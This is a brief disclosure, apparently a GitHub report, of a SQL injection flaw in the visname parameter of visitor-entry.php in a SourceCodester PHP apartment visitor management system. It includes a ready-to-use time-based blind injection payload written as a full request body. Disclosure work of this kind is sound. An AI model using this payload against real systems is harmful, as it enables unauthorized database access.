# The apartment visitor management system has SQL injection vulnerability

## Vulnerability author:liuyuanyuan

supplier:
https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

edition: 
1.0

/visitor-entry.php

SQL injection exists for the visname parameter

Payload: visname=123123' AND (SELECT 8323 FROM (SELECT(SLEEP(5)))CWoH) AND 'WEuT'='WEuT&address=123123&apartmentno=Choose....&whomtomeet=123123&mobilenumber=123123123&gender=Choose&buildingno=&reason=123123&submit=

![image](https://github.com/user-attachments/assets/e0d603af-b9a0-4a28-bf1a-56f6e585122f)

![image](https://github.com/user-attachments/assets/7d2a1124-cd35-485a-8a72-672cebb842dc)

